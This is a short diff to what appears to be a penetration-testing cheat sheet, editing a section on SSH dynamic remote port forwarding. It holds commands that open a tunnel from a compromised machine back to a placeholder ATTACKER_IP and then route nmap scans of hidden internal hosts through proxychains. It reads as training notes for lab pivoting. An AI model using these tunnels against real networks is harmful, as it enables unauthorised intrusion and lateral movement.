@@ -89,9 +89,10 @@ ssh -N -R 127.0.0.1:5555:10.4.171.215:4444 edu@192.168.45.194
 
 ### Dynamic remote port forwarding
 ```
-ssh -N -D 0.0.0.0:LOCAL_PORT ATTACKER_USER@ATTACKER_IP           // Run from the remote machine
-// change "socks5 REMOTE_IP PORT" to "socks5 LCOAL_IP LOCAL_PORT" in /etc/proxychains.conf locally
+ssh -N -R ATTACKER_LOCAL_PORT ATTACKER_USER@ATTACKER_IP           // Run from the remote machine
+// change "socks5 REMOTE_IP PORT" to "socks5 LOCAL_IP LOCAL_PORT" in /etc/proxychains.conf locally
 proxychains nmap -n -sT --top-port=10 HIDDEN_MACHINE_REACHABLE_IP        // make sure to use '-n' and '-sT'
-
-ssh -N -R 1080 kali@192.168.118.4
 ```
+
+
+##### Example output
